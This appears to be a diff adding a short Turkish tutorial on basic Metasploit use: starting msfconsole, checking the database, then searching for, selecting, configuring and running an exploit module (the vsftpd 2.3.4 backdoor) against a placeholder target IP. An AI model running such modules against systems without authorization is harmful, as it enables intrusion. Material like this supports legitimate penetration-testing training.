@@ -1,0 +1,51 @@
+1. Metasploit'i Başlatma
+
+Terminalini açıp şu komutla Metasploit konsoluna gir:
+Bash
+
+msfconsole
+
+Açıldıktan sonra veritabanının bağlı olup olmadığını kontrol etmek için konsol içine şu komutu yaz:
+Plaintext
+
+msf6 > db_status
+
+(Ekranda [*] Connected to msf. Connection type: postgresql. yazısını görüyorsan veritabanın sorunsuz çalışıyor demektir.)
+2. Temel Komutlar ve Çalışma Mantığı
+
+Metasploit terminalinde işlemler her zaman 5 temel adımdan oluşur:
+1. Arama Yapma (search)
+
+Hakkında tarama veya sömürme (exploit) yapmak istediğin servisi veya cihazı ararsın:
+Plaintext
+
+msf6 > search vsftpd
+msf6 > search type:exploit platform:windows smb
+
+2. Modülü Seçme (use)
+
+Listeden kullanmak istediğin modülün yolunu veya sırasını seçersin:
+Plaintext
+
+msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
+
+3. Ayarları Görme (show options)
+
+Seçtiğin modülün hangi parametreleri (hedef IP, port vb.) istediğini kontrol edersin:
+Plaintext
+
+msf6 > show options
+
+4. Parametre Belirleme (set)
+
+Gerekli alanları doldurursun (Örn: Hedef IP adresi olan RHOSTS):
+Plaintext
+
+msf6 > set RHOSTS 192.0.2.50
+
+5. Çalıştırma (run / exploit)
+
+İşlemi başlatırsın:
+Plaintext
+
+msf6 > run
